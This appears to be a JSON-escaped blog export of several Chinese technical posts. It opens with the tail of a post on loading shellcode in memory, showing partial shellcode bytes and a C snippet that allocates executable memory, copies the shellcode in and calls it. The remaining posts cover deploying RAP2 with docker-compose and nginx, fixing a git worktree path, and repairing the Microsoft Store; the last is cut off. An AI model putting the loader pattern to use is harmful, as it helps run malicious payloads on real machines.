ç„¶åè·³è½¬è¿‡å»æ‰§è¡Œå³å¯ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 4\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 5\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 6\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 7\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 8\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 9\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e10\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e11\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e12\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e13\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e14\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e15\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e16\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e17\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// shellcode\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eunsigned\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003echar\u003c/span\u003e shellcode[] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\xd9\\xeb\\x9b\\xd9\\x74\\x24\\xf4\\x31\\xd2\\xb2\\x77\\x31\\xc9\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\x64\\x8b\\x71\\x30\\x8b\\x76\\x0c\\x8b\\x76\\x1c\\x8b\\x46\\x08\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\x8b\\x7e\\x20\\x8b\\x36\\x38\\x4f\\x18\\x75\\xf3\\x59\\x01\\xd1\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ...;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// å®šä¹‰ä¸€ä¸ªå‡½æ•°ç±»å‹\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003etypedef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003evoid\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003e__stdcall\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003eCODE) ();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// ç”³è¯·å†…å­˜\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003ePVOID p \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e NULL;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ep \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eVirtualAlloc\u003c/span\u003e(NULL, \u003cspan style=\"color:#66d9ef\"\u003esizeof\u003c/span\u003e(shellcode), MEM_COMMIT \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// æŠŠshellcodeæ”¾å…¥å†…å­˜\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ememcpy\u003c/span\u003e(p, shellcode, \u003cspan style=\"color:#66d9ef\"\u003esizeof\u003c/span\u003e(shellcode));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCODE code \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e(CODE)p;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ecode\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eæˆ‘å¹¶æ²¡æœ‰å†™å‡ºä¸€ä¸ªå¯ç”¨çš„ \u003ccode\u003ec\u003c/code\u003e åŠ è½½ \u003ccode\u003eshellcode\u003c/code\u003eï¼Œåªæ˜¯æ—¨åœ¨ç‚¹å‡ºä¸€ä¸‹æµç¨‹ï¼Œç„¶åå¼•å‡ºåé¢çš„ \u003ccode\u003epython\u003c/code\u003e åŠ è½½ \u003ccode\u003eshellcode\u003c/code\u003eï¼Œä¸Šé¢æˆ‘ä»¬å…ˆç”³è¯·äº†ä¸€å—å¸¦æœ‰å¯è¯»å¯å†™å¯æ‰§è¡Œæƒé™çš„å†…å­˜ï¼Œç„¶åæŠŠ \u003ccode\u003eshellcode\u003c/code\u003e æ”¾è¿›å»ï¼Œç„¶åæˆ‘ä»¬å¼ºè½¬ä¸ºä¸€ä¸ªå‡½æ•°ç±»å‹æŒ‡é’ˆï¼Œæœ€åè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œè¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„ã€‚\u003c/p\u003e","title":"Pythonå†…å­˜åŠ è½½shellcode"},{"content":"RAP2 æ˜¯ä¸€ä¸ªapiç®¡ç†ç³»ç»Ÿï¼Œå‰åç«¯åä½œå¼€å‘çš„åˆ©å™¨ã€‚\nåœ¨çº¿ä½“éªŒåœ°å€http://rap2.taobao.org\nWebæ¥å£ç®¡ç†å·¥å…·ï¼Œå¼€æºå…è´¹ï¼Œæ¥å£è‡ªåŠ¨åŒ–ï¼ŒMOCKæ•°æ®è‡ªåŠ¨ç”Ÿæˆï¼Œè‡ªåŠ¨åŒ–æµ‹è¯•ï¼Œä¼ä¸šçº§ç®¡ç†ã€‚\næœ‰ä¸€ä»½ä¸€é”®æ­å»ºçš„docker-compose.ymlï¼Œä½†æ˜¯å·²ç»æ˜¯æ¯”è¾ƒè€çš„å‰ç«¯äº†ï¼Œå…·ä½“å¯ä»¥æŸ¥çœ‹https://hub.docker.com/r/taomaree/rap2\næˆ‘è¿™é‡ŒæŠŠä»–çš„docker-compose.ymlè´´å‡ºæ¥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 version: \u0026#39;2.2\u0026#39; services: delos: container_name: rap2-delos image: taomaree/rap2:1.0.6 environment: - MYSQL_URL=rap2-mysql - MYSQL_PORT=3306 - MYSQL_USERNAME=rap2 - MYSQL_PASSWD=rap2delos - MYSQL_SCHEMA=RAP2_DELOS_APP - REDIS_URL=rap2-redis - REDIS_PORT=6379 - NODE_ENV=production working_dir: /app/rap2-delos/dist volumes: - \u0026#34;/srv/rap2-mysql/mysql-backup:/backup\u0026#34; ports: - \u0026#34;38080:80\u0026#34; # expose 38080 links: - redis - mysql depends_on: - redis - mysql redis: container_name: rap2-redis image: redis:4.0 mysql: container_name: rap2-mysql image: mysql:8.0 #ports: # - 33306:3306 volumes: - \u0026#34;/srv/rap2-mysql/mysql-data:/var/lib/mysql\u0026#34; command: mysqld --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci --init-connect=\u0026#39;SET NAMES utf8mb4;\u0026#39; --default-authentication-plugin=mysql_native_password --innodb-flush-log-at-trx-commit=0 environment: - MYSQL_ALLOW_EMPTY_PASSWORD=yes - MYSQL_DATABASE=RAP2_DELOS_APP - MYSQL_USER=rap2 - MYSQL_PASSWORD=rap2delos rap2-init: container_name: rap2-init image: taomaree/rap2:1.0.6 environment: - MYSQL_URL=rap2-mysql - MYSQL_PORT=3306 - MYSQL_USERNAME=rap2 - MYSQL_PASSWD=rap2delos - MYSQL_SCHEMA=RAP2_DELOS_APP - REDIS_URL=rap2-redis - REDIS_PORT=6379 - NODE_ENV=production working_dir: /app/rap2-delos #command: \u0026#39;mysql -h${MYSQL_URL} -u${MYSQL_USERNAME} -p${MYSQL_PASSWD} -e \u0026#34;select * from ${MYSQL_SCHEMA}.Users;\u0026#34; || npm run create-db\u0026#39; command: [\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;sleep 30 \u0026amp;\u0026amp; mysql -h$${MYSQL_URL} -u$${MYSQL_USERNAME} -p$${MYSQL_PASSWD} -e \\\u0026#34;select * from $${MYSQL_SCHEMA}.Users;\\\u0026#34; || node dist/scripts/init\u0026#34;] links: - redis - mysql depends_on: - redis - mysql æ³¨æ„ä¸€ä¸‹æ•°æ®æŒ‚è½½ç›®å½•å°±è¡Œäº†ã€‚ç„¶åè®¿é—®38080ç«¯å£å°±okäº†\nä½†æ˜¯æˆ‘æƒ³è¦æœ€æ–°çš„å‰ç«¯ã€‚\nè¿™ä¸ªæ­å»ºæ˜¯ç¨å¾®æœ‰ç‚¹å¤æ‚çš„\nå¯åŠ¨åç«¯\nä½¿ç”¨å®˜æ–¹è´´å‡ºçš„docker-compose.yml\n1 2 3 4 5 6 mkdir rap2 cd rap2 wget -c https://raw.githubusercontent.com/thx/rap2-delos/master/docker-compose.yml sudo docker-compose up -d dockerèµ·æ¥åï¼Œé»˜è®¤æ˜¯ç›‘å¬38080ç«¯å£ï¼Œä½ å¯ä»¥æŒ‰ç…§è‡ªå·±çš„å–œå¥½ç¼–è¾‘docker-compose.ymlï¼Œå¹¶ä¸”è¿™ä¸ªæ˜¯å…è®¸è·¨åŸŸçš„ï¼Œè·¨åŸŸè§„åˆ™æ¯”è¾ƒæ¾ï¼ŒAllow-Originæ˜¯*ï¼Œæ‰€ä»¥ä½ å¯ä»¥æŠŠå‰ç«¯éƒ¨ç½²åœ¨ä»»ä½•åœ°æ–¹ï¼Œä¸è¿‡æˆ‘ä¹ æƒ¯éƒ¨ç½²åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚\néƒ¨ç½²å‰ç«¯\né¦–å…ˆä¸‹è½½å‰ç«¯\n1 git clone https://github.com/thx/rap2-dolores.git ç„¶åä¿®æ”¹å‰ç«¯çš„é…ç½®ï¼Œè¿™ä¸€æ­¥æ˜¯ä¸ºäº†ä¸åç«¯å¯¹æ¥\næˆ‘æ˜¯æ‰“ç®—æŠŠæ•´ä¸ªæœåŠ¡éƒ¨ç½²åœ¨ mock.test.com åŸŸåä¸‹ï¼Œç„¶å http://mock.test.com/api ä½œä¸ºæ¥å£çš„æ ¹urlï¼ˆè¿™é‡Œéœ€è¦é nginxæ¥é‡å†™ï¼‰\né‚£ä¹ˆæˆ‘ä»¬éœ€è¦ä¿®æ”¹å‰ç«¯çš„é…ç½®æ–‡ä»¶\nè¿›å…¥æˆ‘ä»¬åˆšæ‰cloneä¸‹æ¥çš„ç›®å½• rap2-dolores/src/configä¸‹ï¼Œä¿®æ”¹ config.prod.ts æ–‡ä»¶\nåªéœ€è¦ä¿®æ”¹ serve å­—æ®µçš„å€¼å³å¯ã€‚\nç„¶åç¼–è¯‘å‰ç«¯ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨æ·˜å®çš„æº\n1 2 3 4 5 cd rap2-dolores npm install --registry=https://registry.npm.taobao.org npm run build ç¼–è¯‘å®Œæˆåï¼Œrap2-dolores ç›®å½•ä¸‹ä¼šå‡ºç°ä¸€ä¸ªåå­—ä¸º build æˆ–è€… dist çš„æ–‡ä»¶å¤¹ï¼ŒæŠŠè¿™ä¸ªæ–‡ä»¶å¤¹æ”¾åˆ°ä½ åˆšæ‰æ”¾docker-compose.ymlçš„ç›®å½•ä¸‹ï¼ˆä¸ºäº†ä»¥åè¿ç§»æ–¹ä¾¿ï¼Œå¯ä»¥æ”¾åœ¨ä»»æ„ä½ç½®ï¼Œåªéœ€è¦ä¿®æ”¹å¯¹åº”çš„nginxé…ç½®å³å¯ï¼‰\nè¿™é‡Œæˆ‘å‡å®šç¼–è¯‘å‡ºæ¥çš„æ˜¯ build æ–‡ä»¶å¤¹ï¼Œæ”¾ç½®åˆ°docker-compose.ymlæ‰€åœ¨çš„ç›®å½•\né‚£ä¹ˆç°åœ¨ä½ çš„ç›®å½•ç»“æ„åº”è¯¥æ˜¯è¿™æ ·\n1 2 3 4 5 6 7 8 9 lab@lab-desktop:~/dockers/rap2$ pwd /home/lab/dockers/rap2 lab@lab-desktop:~/dockers/rap2$ tree -L 1 . â”œâ”€â”€ docker-compose.yml â”œâ”€â”€ build â””â”€â”€ docker 2 directories, 1 file ç„¶åæ–°å»ºnginxé…ç½®æ–‡ä»¶\n1 sudo vim /etc/nginx/sites-enabled/mock.test.com.conf å†™å…¥ä»¥ä¸‹å†…å®¹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 server { listen 80; listen [::]:80; server_name mock.test.com; root /home/lab/dockers/rap2/build; # reverse proxy location /api/ { # 38080åé¢åŠ /æ˜¯ä¸ºäº†æŠŠhttp://127.0.0.1:38080/api/*åä»£åˆ°http://127.0.0.1:38080/* proxy_pass http://127.0.0.1:38080/; # 38080åé¢çš„/æ˜¯å¿…è¦çš„ï¼Œæ˜¯å¦ä¼šé™„åŠ locationé…ç½®è·¯å¾„ä¸proxy_passé…ç½®çš„è·¯å¾„åæ˜¯å¦æœ‰\u0026#34;/\u0026#34;æœ‰å…³ï¼Œæœ‰\u0026#34;/\u0026#34;åˆ™ä¸é™„åŠ  # ä»£ç†é…ç½®ï¼Œå¯é€‰ proxy_http_version 1.1; proxy_cache_bypass $http_upgrade; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;upgrade\u0026#34;; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-Host $host; proxy_set_header X-Forwarded-Port $server_port; } location / { # è·¯ç”±åœ¨å‰ç«¯ï¼Œåç«¯æ²¡æœ‰çœŸå®è·¯ç”±ï¼Œåœ¨è·¯ç”±ä¸å­˜åœ¨çš„ 404çŠ¶æ€çš„é¡µé¢è¿”å› /index.html # è¿™ä¸ªæ–¹å¼ä½¿ç”¨åœºæ™¯ï¼Œä½ åœ¨å†™Reactæˆ–è€…Vueé¡¹ç›®çš„æ—¶å€™ï¼Œæ²¡æœ‰çœŸå®è·¯ç”± try_files $uri /index.html; } } ç„¶åé‡å¯ä¸€ä¸‹nginxï¼Œè®¿é—®mock.test.comå°±å¯ä»¥äº†\nè¿™é‡Œç»™å‡ºä¸€ä»½æ¯”è¾ƒè¯¦å°½çš„nginxé…ç½®æ•™ç¨‹\nNginx ä»£ç†è½¬å‘ï¼Œè®©ç”Ÿäº§å’Œæµ‹è¯•ç¯å¢ƒ Reactã€Vue é¡¹ç›®è½»æ¾è®¿é—® APIï¼Œå‰ç«¯è·¯ç”±ä¸å† 404Â https://juejin.im/entry/58df166a0ce463005821e9d9 Reference Nginx\u0026mdash;\u0026mdash;locationå¸¸è§é…ç½®æŒ‡ä»¤ï¼Œaliasã€rootã€proxy_pass https://github.com/taomaree/docker-rap2 https://github.com/thx/rap2-delos/wiki/docker https://github.com/thx/rap2-delos/issues/119#issuecomment-392762261 https://github.com/thx/rap2-dolores Api æ–‡æ¡£ç®¡ç†ç³»ç»Ÿ RAP2ç¯å¢ƒæ­å»º ","permalink":"https://www.hacktech.cn/post/rap2-api-manage-building.html","summary":"\u003cp\u003eRAP2 æ˜¯ä¸€ä¸ªapiç®¡ç†ç³»ç»Ÿï¼Œå‰åç«¯åä½œå¼€å‘çš„åˆ©å™¨ã€‚\u003c/p\u003e\n\u003cp\u003eåœ¨çº¿ä½“éªŒåœ°å€\u003ca href=\"http://rap2.taobao.org\"\u003ehttp://rap2.taobao.org\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eWebæ¥å£ç®¡ç†å·¥å…·ï¼Œå¼€æºå…è´¹ï¼Œæ¥å£è‡ªåŠ¨åŒ–ï¼ŒMOCKæ•°æ®è‡ªåŠ¨ç”Ÿæˆï¼Œè‡ªåŠ¨åŒ–æµ‹è¯•ï¼Œä¼ä¸šçº§ç®¡ç†ã€‚\u003c/p\u003e","title":"RAP2 å‰åç«¯å¼€å‘åˆ©å™¨æ­å»º"},{"content":"ä»Šå¤©æ¢äº†ç”µè„‘ï¼Œæˆ‘ç›´æ¥æŠŠæ•´ä¸ªä»“åº“ä»ç”µè„‘Aå¤åˆ¶åˆ°äº†ç”µè„‘Bï¼ŒåŒ…æ‹¬ä»“åº“ä¸‹é¢çš„ .git æ–‡ä»¶å¤¹ã€‚\nä¿®æ”¹ä»£ç åæˆ‘æ‰§è¡Œäº†ä¸€ä¸‹ git add .\nå‡ºç°äº†ä¸€ä¸ªæŠ¥é”™\n1 fatal: Invalid path \u0026#39;D:/Studio/Repo\u0026#39;: No such file or directory çœ‹äº†ä¸‹ï¼Œè¿™ä¸æ˜¯æˆ‘ä¸Šä¸€å°ç”µè„‘çš„ä»“åº“ç›®å½•å—ã€‚\næˆ‘åœ¨ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°ä¸€ä¸ªæ¯”è¾ƒå¥½çš„è§£å†³æ–¹æ¡ˆã€‚\næƒ³äº†æƒ³ï¼Œgitä»“åº“é…ç½®éƒ½æ˜¯åœ¨ .git æ–‡ä»¶å¤¹ä¸‹é¢ï¼Œä¸‹é¢è‚¯å®šæœ‰é…ç½®æ–‡ä»¶ã€‚\nç›´æ¥æ‹¿æ–‡æœ¬æœç´¢å·¥å…·æœç´¢äº†ä¸€ä¸‹ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„ grep\n1 2 Î» grep -rn \u0026#34;D:/Code\u0026#34; ./.git ./.git/config:6: worktree = D:/Studio/Repo/theproject å¯ä»¥çœ‹åˆ°configé‡Œé¢æœ‰è¿™ä¸ªé…ç½®ï¼Œç›´æ¥æŠŠè¿™ä¸ª worktree æ”¹æˆä½ ç°åœ¨é¡¹ç›®æ‰€åœ¨çš„ä½ç½®å³å¯è§£å†³é—®é¢˜\n","permalink":"https://www.hacktech.cn/post/git-invalid-path.html","summary":"\u003cp\u003eä»Šå¤©æ¢äº†ç”µè„‘ï¼Œæˆ‘ç›´æ¥æŠŠæ•´ä¸ªä»“åº“ä»ç”µè„‘Aå¤åˆ¶åˆ°äº†ç”µè„‘Bï¼ŒåŒ…æ‹¬ä»“åº“ä¸‹é¢çš„ \u003ccode\u003e.git\u003c/code\u003e æ–‡ä»¶å¤¹ã€‚\u003c/p\u003e\n\u003cp\u003eä¿®æ”¹ä»£ç åæˆ‘æ‰§è¡Œäº†ä¸€ä¸‹ \u003ccode\u003egit add .\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eå‡ºç°äº†ä¸€ä¸ªæŠ¥é”™\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efatal: Invalid path \u0026#39;D:/Studio/Repo\u0026#39;: No such file or directory\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eçœ‹äº†ä¸‹ï¼Œè¿™ä¸æ˜¯æˆ‘ä¸Šä¸€å°ç”µè„‘çš„ä»“åº“ç›®å½•å—ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘åœ¨ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°ä¸€ä¸ªæ¯”è¾ƒå¥½çš„è§£å†³æ–¹æ¡ˆã€‚\u003c/p\u003e\n\u003cp\u003eæƒ³äº†æƒ³ï¼Œgitä»“åº“é…ç½®éƒ½æ˜¯åœ¨ \u003ccode\u003e.git\u003c/code\u003e æ–‡ä»¶å¤¹ä¸‹é¢ï¼Œä¸‹é¢è‚¯å®šæœ‰é…ç½®æ–‡ä»¶ã€‚\u003c/p\u003e\n\u003cp\u003eç›´æ¥æ‹¿æ–‡æœ¬æœç´¢å·¥å…·æœç´¢äº†ä¸€ä¸‹ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„ \u003ccode\u003egrep\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eÎ» grep -rn \u0026#34;D:/Code\u0026#34; ./.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./.git/config:6:        worktree = D:/Studio/Repo/theproject\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eå¯ä»¥çœ‹åˆ°configé‡Œé¢æœ‰è¿™ä¸ªé…ç½®ï¼Œç›´æ¥æŠŠè¿™ä¸ª worktree æ”¹æˆä½ ç°åœ¨é¡¹ç›®æ‰€åœ¨çš„ä½ç½®å³å¯è§£å†³é—®é¢˜\u003c/p\u003e","title":"gitå‡ºç°Invalid path"},{"content":"å…·ä½“è¡¨ç°ä¸ºä¸€ç›´å®‰è£…å¤±è´¥ï¼Œä½†æ˜¯ä¸‹è½½è¿›åº¦æ¡ä¸€ç›´åœ¨ï¼Œæ— æ³•å»é™¤ã€‚\næ­¤æ–¹æ³•æ¥è‡ª https://answers.microsoft.com/en-us/windows/forum/all/error-code-0x80070057-when-installing-intel-media/725eff00-5f06-4336-8d41-2cb2f5999b88\nIf you are able to open MS Store, open MS Store \u0026gt; Click on your profile picture on top right and sign-out. Then sign-in again.\nRun Windows Store Apps Troubleshooter Windows Key+X \u0026gt; Click Settings \u0026gt; Click Update \u0026amp; security \u0026gt; Click Troubleshoot \u0026gt; Scroll down to the bottom \u0026gt; Click Windows Store Apps \u0026gt; Click Run the Troubleshooter\nReset Windows Store through Command Prompt Type cmd in Windows Search box \u0026gt; Right click on Command Prompt \u0026gt; Run As Administrator \u0026gt; Type WSreset.exe and click Enter \u0026gt; Reboot your computer\nRe-register All Store apps (You will get many Reds, ignore them) Windows Key+X \u0026gt; Windows Powershell (Admin) \u0026gt; Copy the following from below and right click in Powershell to paste \u0026gt; Enter \u0026gt; Restart your computer\nGet-AppXPackage -AllUsers | Foreach {Add-AppxPackage -DisableDevelopmentMode -Register 